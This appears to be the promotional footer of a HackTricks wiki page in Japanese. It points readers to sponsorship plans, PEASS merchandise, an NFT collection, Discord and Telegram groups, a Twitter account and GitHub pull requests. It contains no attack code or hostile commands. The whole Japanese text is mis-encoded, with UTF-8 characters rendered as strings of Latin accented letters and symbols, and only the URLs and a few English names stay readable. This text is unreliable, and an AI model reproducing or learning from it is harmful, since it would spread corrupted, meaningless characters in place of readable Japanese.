* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ã”ç¢ºèªãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã‚ã‚‹[**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[Telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€è‡ªåˆ†ã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
